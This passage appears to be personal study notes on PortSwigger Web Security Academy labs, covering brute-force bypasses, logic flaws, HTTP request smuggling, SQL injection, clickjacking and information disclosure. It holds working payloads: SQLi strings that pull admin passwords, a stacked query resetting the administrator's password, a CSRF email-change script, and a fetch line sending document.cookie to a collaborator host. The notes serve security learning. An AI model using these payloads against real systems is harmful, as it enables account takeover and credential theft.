- IP rate limiting or blocking
    - bypass: X-Forwarded-For header 
- locking account after too many failed attempts
    - bypass: counter may reset on correct login; so brute-force until BEFORE limit, login to your account, that resets counter -&gt; continue process
</code></pre>
<h3 id="lab-3---broken-brute-force-protection-ip-block"><a class="header" href="#lab-3---broken-brute-force-protection-ip-block">Lab 3 - Broken brute-force protection, IP block</a></h3>
<ul>
<li>this lab resets the counter of wrong attempts on correct login, so it requires a sequence of tries like: <strong>try1,try2,reset</strong> or <strong>try,reset,try,reset</strong></li>
<li>we can use the <code>bruteforceBypass.py</code> script</li>
<li>or we can use a <code>MACRO</code> in BurpSuite
<ul>
<li>go into Proxy Settings - Session - Macro - Add - choose the request that resets the counter(the correct login)</li>
<li>then go into the Proxy Settings - Session handling rules - add a macro -  add the macro, and make sure to check <code>Include all URLS</code> in the scope window</li>
</ul>
</li>
<li>or use <code>Turbo Intruder</code> (much faster too)
<ul>
<li><img src="image.png" alt="alt text" /></li>
</ul>
</li>
</ul>
<h3 id="lab-4---username-enumeration-via-account-lock"><a class="header" href="#lab-4---username-enumeration-via-account-lock">Lab 4 - Username enumeration via account lock</a></h3>
<ul>
<li>this lab locks you out if the username is valid, but otherwise lets you try passwords forever</li>
<li>For each username, launch an attack with 4-5 passwords, and when you get locked out -&gt; valid username!!!</li>
<li>So then you do a intruder normal sniper attack with the passwords and you get the password even with lockouts.</li>
</ul>
<h3 id="lab-5---offline-password-cracking"><a class="header" href="#lab-5---offline-password-cracking">Lab 5 - Offline password cracking</a></h3>
<ul>
<li>the password was kept in a cookie in base64 encoding + md5 hash</li>
<li>so we only needed to steal the cookie</li>
</ul>
<p>wiener@exploit-0a1d009c03fd40c087b5dc67019700a7.exploit-server.net</p>
<h1 id="business-logic-labs"><a class="header" href="#business-logic-labs">Business logic labs</a></h1>
<h3 id="lab-1-low-level-logic-flaw"><a class="header" href="#lab-1-low-level-logic-flaw">Lab 1: Low-level logic flaw</a></h3>
<ul>
<li>aim for an <code>integer overflow</code> (integer max: <strong>2,147,483,647</strong>)</li>
<li>use the Intruder to add 99 items at once multiple times(since 99 is the limit in one api call) -&gt; observe that you get after a while the total to be negative</li>
<li>try to buy -&gt; ERROR: total cannot be negative</li>
<li>SOLUTION: add again items until the integer overflows again to the positives and add smaller items to make the total under your store credit!</li>
</ul>
<h3 id="lab-2-inconsistent-handling-of-exceptional-input"><a class="header" href="#lab-2-inconsistent-handling-of-exceptional-input">Lab 2: Inconsistent handling of exceptional input</a></h3>
<ul>
<li>aim for <code>buffer overflow</code></li>
<li>observe that for a long enought email you can get it truncated, while also keeping the whole address for the email confirmation!!!</li>
<li>then play with the concept of:
<ul>
<li><code>You can use the link in the lab banner to access an email client connected to your own private mail server. The client will display all messages sent to @YOUR-EMAIL-ID.web-security-academy.net and any arbitrary subdomains. Your unique email ID is displayed in the email client.</code> -&gt; subdomains means: <strong>a@YOUR-EMAIL-ID.web-security-academy.net</strong> but also <strong>a@something.YOUR-EMAIL-ID.web-security-academy.net</strong></li>
</ul>
</li>
<li>Combine them: add exactly as many characters before <code>@dontwannacry.com</code>
so that it overflows the limit and the email in the app remains with the ending @dontwannacry,com == <strong>ADMIN ACCOUNT</strong></li>
<li>final payload email: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0adf0019041165ce8369c75801ed004f.exploit-server.net</code></li>
</ul>
<h3 id="authentication-bypass-via-encryption-oracle"><a class="header" href="#authentication-bypass-via-encryption-oracle">Authentication bypass via encryption oracle</a></h3>
<ul>
<li>Whenever you see <strong>remember-me</strong> login , it probably keeps login data in a cookie</li>
<li>In this case it uses some special encoding with a 16bit padded cipher with a private key</li>
<li><code>Try to find also a decrypt functionality</code></li>
<li>In this problem it provides encoded error messages that are then decoded on the main page when provided in the notification cookie</li>
<li>When you recognize patterns, like base64, it sure as hell is base64. Like here you had to delete 16bit chuncks but not from the base64, but from the base64 hex decoding, And you then had to re-encode the payload with base64
<ul>
<li>You can observer the decoding by passing the stay-logged-in cookie to the notification cookie and seeing an error message like: <code>wiener:12797018361</code></li>
<li>Then we use the error generation in the email field of the comment post request to generate the payload: <code>administrator:126726310</code>.</li>
<li>But the error message is: <code>Invalid email address: </code> so we have to pad it to our payload with enough chars to be 16-bit padded (which we identified from passing different payloads)</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="request-smuggling"><a class="header" href="#request-smuggling">Request Smuggling</a></h1>
<ul>
<li>primarily associated with HTTP/1 and only certain backend technologies of HTTP/2</li>
<li>it regards the sequence in which a server processes HTTP requests</li>
</ul>
<h2 id="main-idea"><a class="header" href="#main-idea">Main idea</a></h2>
<ul>
<li>Bigger web apps use a <code>front-end server (reverse proxy/load balancer)</code> that receive the incoming request and then distributes the request further to the <code>backend servers</code></li>
<li>To be more efficient, they send <code>multiple HTTP requests</code> over the same network connection! The backend then interprets where one request ends and the next one begins</li>
<li><strong>In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests, otherwise this can be exploited</strong></li>
<li><h3 id="how-do-they-specify-the-boundary-content-length-and-transfer-encoding"><a class="header" href="#how-do-they-specify-the-boundary-content-length-and-transfer-encoding">How do they specify the boundary? Content-Length and Transfer-Encoding</a></h3>
</li>
<li><code>ex: Content-Length: 11</code></li>
<li>ex:</li>
</ul>
<pre><code>Transfer-Encoding: chunked
\r\n               |always leave space between request and contents
b                  |size in hex
q=smuggling        |contents
0\r\n              |ending zero chunk
\r\n               |ending zero chunk
</code></pre>
<ul>
<li>
<p><strong>NOTE:</strong></p>
<ul>
<li>not all servers support the <code>Transfer-Encoding</code> header</li>
<li>if both <code>Transfer-Encoding</code> and <code>Content-Length</code> are present the <code>Content-Length</code> is <code>ignored</code>!!!</li>
</ul>
</li>
<li>
<p><strong>TYPES OF ATTACKS</strong></p>
<ul>
<li><code>Put both the Content-Length and Transfer-Encoding headers into the request to trigger parsing inconsistencies</code></li>
<li><code>CL.TE</code> (frontend uses CL, backend uses TE)</li>
<li><code>TE.CL</code></li>
<li><code>TE.TE</code> (both use TE but one of the servers can be induced not to process it through <code>obfuscation</code>)</li>
</ul>
</li>
<li>
<p>How to detect <code>CL.TE</code>
<img src="images/image-2.png" alt="alt text" />
<img src="images/image-1.png" alt="alt text" /></p>
<ul>
<li>things to look out for:
<ol>
<li>HTTP/1</li>
<li>Turn off automatic Content Length</li>
<li>First test, then send confirmation payload</li>
</ol>
</li>
</ul>
</li>
<li>
<p>Obfuscating TE for <code>TE.TE attacks</code></p>
</li>
</ul>
<pre><code>Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
</code></pre>
<ul>
<li>
<p>The <code>TE.TE</code> is actually just a <code>TE.CL</code>, so follow the same methodology, try TE.CL payload test (with timeout) and <code>obfuscate the TE header</code> until you get the timeout !!!</p>
</li>
<li>
<p>TO confirm these vulns you can either smuggle a single char and hope for a <code>Unrecognized method GPOST</code> or you could trigger a POST to a <code>/404</code> page to trigger a <code>404 not found</code> to confirm that the payload worked!</p>
</li>
</ul>
<h2 id="exploiting-http-request-smuggling"><a class="header" href="#exploiting-http-request-smuggling">Exploiting HTTP request smuggling</a></h2>
<ul>
<li>
<h4 id="bypass-frontend-server-access-controls-and-filters"><a class="header" href="#bypass-frontend-server-access-controls-and-filters">Bypass Frontend Server <code>Access Controls</code> and <code>Filters</code></a></h4>
<ul>
<li>ex: POST /home with a smuggled GET request for /admin</li>
<li>Exercise: <em>Delete carlos through admin panel with smuggled request</em>
<ul>
<li><code>CL.TE payload</code></li>
<li><img src="images/image-3.png" alt="alt text" /></li>
<li><code>TE.CL payload</code></li>
<li><img src="images/image-4.png" alt="alt text" /></li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="revealing-front-end-rewriting"><a class="header" href="#revealing-front-end-rewriting">Revealing front-end rewriting</a></h4>
<ul>
<li>the front-end server might:
<ul>
<li>terminate the TLS connection and add some headers describing the protocol and ciphers that were used;</li>
<li>add an X-Forwarded-For header containing the user's IP address;</li>
<li>determine the user's ID based on their session token and add a header identifying the user; or</li>
<li>add some sensitive information that is of interest for other attacks.</li>
</ul>
</li>
<li>Add the smuggled request into a paramter whose value is reflected in the response to reveal ANY HIDDEN HTTP HEADER values</li>
<li><img src="images/image-5.png" alt="alt text" /></li>
<li><em>Exercise</em>:
<ul>
<li><img src="images/image-7.png" alt="alt text" /></li>
<li><img src="images/image-6.png" alt="alt text" /></li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="sql-injection"><a class="header" href="#sql-injection">SQL injection</a></h2>
<ul>
<li>SQLi vulnerabilities can allow an attacker to modify or delete data, compromise the underlying server or even perform <code>denial of service</code> attacks.</li>
</ul>
<h3 id="detection"><a class="header" href="#detection">Detection</a></h3>
<ul>
<li><code>'</code>, <code>OR 1=1</code>, <code>OR 1=2</code>, <code>time based payloads</code>, <code>OAST payloads</code></li>
</ul>
<h3 id="common-injection-points"><a class="header" href="#common-injection-points">Common injection points</a></h3>
<ul>
<li>
<p>SELECT * from Where <strong>SQLi</strong></p>
</li>
<li>
<p>UPDATE set x=1 where <strong>SQLi</strong></p>
</li>
<li>
<p>INSERT into x values (<strong>SQLi</strong>)</p>
</li>
<li>
<p>SELECT <strong>SQLi</strong> from <strong>SQLi</strong> ORDER BY <strong>SQLi</strong></p>
</li>
<li>
<p>Ways to exploit login: username: <code>admin'--</code> or password=<code>pass'+OR+1=1--</code></p>
</li>
</ul>
<h3 id="sql-injection-union-attacks"><a class="header" href="#sql-injection-union-attacks">SQL injection UNION attacks</a></h3>
<ul>
<li>
<p><code>EMBER MULTIPLE SELECT STATEMENTS</code></p>
</li>
<li>
<p><strong>EX: SELECT A,B, FROM TABLE1 UNION SELECT C,D FROM TABLE2</strong></p>
</li>
<li>
<p>This needs <code>same nr of columns</code>, and <code>compatible types of columns</code></p>
</li>
<li>
<p>STEPS:</p>
<ul>
<li>determine nr of columns
<ul>
<li><code>ORDER BY n</code> until it fails</li>
<li><code>UNION SELECT NULL, NULL, NULL....(FROM DUAL -- FOR ORACLE)</code>until it succeeds and adds a null column</li>
</ul>
</li>
<li>determine the types
<ul>
<li><code>UNION SELECT 'a', NULL, NULL....(FROM DUAL -- FOR ORACLE)</code>until it succeeds and adds a null column</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>COMBINE MULTIPLE COLUMNS</code> : <code>SELECT USERNAME || '-' || PASSWORD FROM TABLE</code>(IN ORACLE)</p>
</li>
<li>
<h3 id="how-to-inspect-the-database-tables-and-properties"><a class="header" href="#how-to-inspect-the-database-tables-and-properties">How to inspect the database tables and properties</a></h3>
<ul>
<li><code>SELECT @@VERSION</code><strong>MYSQL</strong>, <code>SELECT * FROM v$version</code> <strong>ORACLE</strong>, <code>SELECT version()</code> <strong>PostgreSQL</strong></li>
<li><code>SELECT * FROM information_schema.tables</code> or <code>.columns</code></li>
<li>ex STEP1: category=Gifts' UNION SELECT table_name,NULL from information_schema.tables</li>
<li>ex STEP2: category=Gifts' UNION SELECT column_name,NULL from information_schema.columns where table_name='TABLENAME FOUND AT STEP 1'</li>
<li>ex STEP3: category=Gifts' UNION SELECT column1,column2 from 'TABLENAME FOUND AT STEP 1' -&gt; to get the data</li>
</ul>
</li>
</ul>
<h3 id="blind-sql-injections"><a class="header" href="#blind-sql-injections">Blind SQL injections</a></h3>
<ul>
<li><code>Cookies like TrackingId=jhkahkjdlsahlda9</code>can also be an injection point!</li>
<li>Analyse the difference in behaviour for <code>'AND'1'='1</code> and for <code>'AND'1'='2</code> (ex: Welcome back message!)</li>
<li>DETERMINE DATA ONE STEP AT A TIME
- use <code>SUBSTRING(data, start, length)</code> for this
- ex: <code>TrackingId=t5gh9WYA3E8wgTlF'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a</code></li>
</ul>
<h3 id="error-based-sql-injection-blind"><a class="header" href="#error-based-sql-injection-blind">Error-based SQL injection (BLIND)</a></h3>
<ul>
<li>In case boolean SQLi doesn't have an indication of success visible in the application response, you turn to Error-based SQL injection and hope that unhandeld SQL errors will cause a difference in the response.</li>
<li>Induce an error as an indication of success, or have the data returned into error messages -&gt; visible SQLi.</li>
<li>TEST PAYLOAD: <code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a</code></li>
<li>EXPLOIT PAYLOAD: <code>xyz' AND (SELECT CASE WHEN (username='admin' and substring(password, 1, 1)='a') THEN 1/0 ELSE 'a' END) = 'a</code></li>
<li><strong>Verbose error messages</strong>:
<ul>
<li>CAST() to int to force a select result to generate an error with the output of the select.</li>
<li><code>CAST((SELECT example_column FROM example_table) AS int)</code> -&gt; <code>ERROR: invalid input syntax for type integer: "Example data"</code></li>
<li>PAYLOAD: <code>TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--</code></li>
</ul>
</li>
<li><strong>Time based BLIND SQL injection</strong>
<ul>
<li>if errors are handled in code, then your next idea is time based</li>
<li>These happen if the SQL is handles sinchrounously and if you add a delay in the sql query it should DELAY also the HTTP response (<strong>inefficient if done async</strong>)</li>
<li>PAYLOAD: <code>'%3b(SELECT CASE WHEN ((SELECT SUBSTRING(password,{i},1) from users where username='administrator')='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--</code></li>
</ul>
</li>
</ul>
<h3 id="blind-sql-out-of-band-techinqueoast"><a class="header" href="#blind-sql-out-of-band-techinqueoast">Blind SQL Out-of-band techinque(OAST)</a></h3>
<ul>
<li>What if the SQL query is handled <code>asynchronously</code>? Then no more time based attacks...</li>
<li>You need to trigger <code>OUT OF BAND interactions</code> to a system that you control.(DNS lookups)</li>
<li><code>Use Burp Collaborator for this!</code></li>
<li>If you identify that a DNS lookup happened to your domain, then you can append to the url the output of any query directly and you get them in the DNS query.</li>
</ul>
<h3 id="xml-encoded-sqli"><a class="header" href="#xml-encoded-sqli">XML encoded SQLi</a></h3>
<ul>
<li>You can encode your payload in any format: JSON, XML</li>
<li>Sometimes there is a <code>WAF</code> to bypass -&gt; you can use Hackvertor from BurpSUite extensions, and wrap your payload in a xml tag to bypass it</li>
<li>ex: `</li>
</ul>
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>
<p>1
</productId><storeId>&lt;@dec_entities&gt;1 UNION SELECT username||'+'||password from users LIMIT 5&lt;@/dec_entities&gt;</storeId></stockCheck>`</p>
<ul>
<li>
<p>The <code>&lt;@dec_entities&gt;</code> tag is used to encode the sqli payload like this behind the scenes:</p>
<p></productId><storeId>1 UNION SELECT username||'+'||password from users LIMIT 5</storeId></stockCheck></p>
</li>
</ul>
<h2 id="second-order-sql-injections--stored-sqli"><a class="header" href="#second-order-sql-injections--stored-sqli">Second order SQL injections = STORED SQli</a></h2>
<ul>
<li>ex: create a username like: <code>badguy';update users set password='letmein' where user='administrator'</code> -&gt; trigger the SQLi in a later HTTP request</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h3 id="information-disclosure"><a class="header" href="#information-disclosure">Information disclosure</a></h3>
<ul>
<li>In php websites, debug file with the output of phpinfo() is <code>/cgi-bin/phpinfo.php</code></li>
<li>Look for backups: /backup folder or: <code>file.ext~, #file.ext#, ~file.ext, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old</code></li>
<li>Look for robots.txt or sitemap.xml</li>
<li>The <code>TRACE</code> <code>HTTP request</code> method is primarily used for diagnostic purposes. It echoes back the received request so that the client can see what changes or additions might have been made by intermediate servers.
<ul>
<li>Useful to determine if additional headers were appended by proxy servers.</li>
</ul>
</li>
<li>CHECK VERSION CONTROL: see if there is a .git folder on the server, and if there is extract it with <code>git-dumper</code></li>
</ul>
<pre><code class="language-javascript">&lt;script&gt;
var ref = new XMLHttpRequest();
ref.open('post', 'https://0a3c00de0493af8582f1f131005b00dd.web-security-academy.net/my-account/change-email', true);
ref.withCredentials = true;
ref.send('email=test@ahdyue.net');
&lt;/script&gt;
</code></pre>
<ul>
<li>Some applications trust the HOST header <strong>TOO MUCH</strong>
<ul>
<li>-&gt; password reset poisoning: forgot-password link generated dynamically based on the HOST header address -&gt; change host header to an attacker controlled website -&gt; when the user clicks the "password-reset link" it will appear with the reset token in the attacker's logs so that it can use it on the real vulnerable app</li>
<li>-&gt; HOST header to allow admin to localhost!!!</li>
</ul>
</li>
</ul>
<h3 id="clickjacking"><a class="header" href="#clickjacking">Clickjacking</a></h3>
<ul>
<li>create 2 layers: decoy website + target website</li>
<li>decoy website is put behind target website, and target website is put with opactiy 0.00001 = transparent</li>
<li>the user only sees the decoy website, that is actually behind the real interface of the target. If you put buttons aligned on decoy with target, when they "click" on the decoy button -&gt; it actually clicks the layer 1, which is the target without them knowing !!!</li>
<li>PREVENTION: <code>frame-busters!!!</code> scripts that don't allow the website to be framed inside an iframe -&gt; makes elements visible, takes over top-window, doesn't allow actions on invisible elements!</li>
</ul>
<h3 id="xxe---xml-external-entity-injection"><a class="header" href="#xxe---xml-external-entity-injection">XXE - XML external entity injection</a></h3>
<ul>
<li>view files on filesystem of server + interact with backend systems</li>
</ul>
<h3 id="essential-skills"><a class="header" href="#essential-skills">Essential skills</a></h3>
<ul>
<li>scan a specific insertion point</li>
<li>if you find XSS with OAST technique, send over the cookies of the administrator (stored XSS)</li>
<li>in JS, you have 2 functions for <code>normalizing the cookies</code>
<ul>
<li><code>encodeURI</code> - leaves <code>=</code>,<code>&amp;</code> and <code>?</code> intact since they have a meaning in the URI</li>
<li><code>encodeURIComponent</code> - encodes ALL in order for it to be processed as a URL component</li>
</ul>
</li>
<li>STRING INTERPOLATION IN JAVASCRIPT
<ul>
<li>x = <code>Hello ${x}</code></li>
</ul>
</li>
<li>ex: fetch('http://collaborator/${encodeURIComponent(document.cookie)}')</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
